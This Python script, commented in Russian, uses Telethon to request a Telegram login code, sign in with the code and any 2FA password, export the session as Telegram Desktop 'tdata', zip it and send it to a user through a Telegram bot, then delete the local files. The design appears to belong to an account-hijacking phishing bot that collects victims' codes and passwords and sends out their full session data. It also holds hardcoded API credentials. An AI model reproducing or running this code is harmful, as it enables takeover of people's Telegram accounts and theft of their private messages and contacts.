import asyncio
import os
import urllib.parse
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError

API_ID = int(os.environ.get("API_ID", "30205421"))
API_HASH = os.environ.get("API_HASH", "410de2c0ba6d0915000a16961cea2229")

os.makedirs('sessions', exist_ok=True)

async def send_code(phone: str):
    client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
    await client.connect()
    result = await client.send_code_request(phone)
    await client.disconnect()
    return result.phone_code_hash

async def sign_in(phone: str, code: str, phone_code_hash: str, password: str = None):
    client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
    await client.connect()
    try:
        if code:
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        if password:
            await client.sign_in(password=password)
    except SessionPasswordNeededError:
        if password:
            await client.sign_in(password=password)
        else:
            await client.disconnect()
            raise Exception("2FA required")
    await client.disconnect()
    return True

async def export_tdata(phone: str, bot_token: str, user_id: int):
    try:
        from opentele.td import TDesktop
        from opentele.api import UseCurrentSession

        client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
        await client.connect()

        tdesk = await TDesktop.FromTelethon(client, flag=UseCurrentSession)
        tdata_path = f'sessions/tdata_{phone}'
        tdesk.SaveTData(tdata_path)

        await client.disconnect()

        # Упаковываем в zip
        import shutil
        zip_path = f'sessions/tdata_{phone}.zip'
        shutil.make_archive(f'sessions/tdata_{phone}', 'zip', tdata_path)

        # Отправляем боту
        from aiogram import Bot
        bot = Bot(token=bot_token)
        with open(zip_path, 'rb') as f:
            await bot.send_document(
                user_id,
                f,
                caption=f'✅ tdata для {phone}'
            )
        await bot.session.close()

        # Чистим файлы
        shutil.rmtree(tdata_path, ignore_errors=True)
        os.remove(zip_path)

        return True
    except Exception as e:
        print(f'tdata error: {e}')
        return False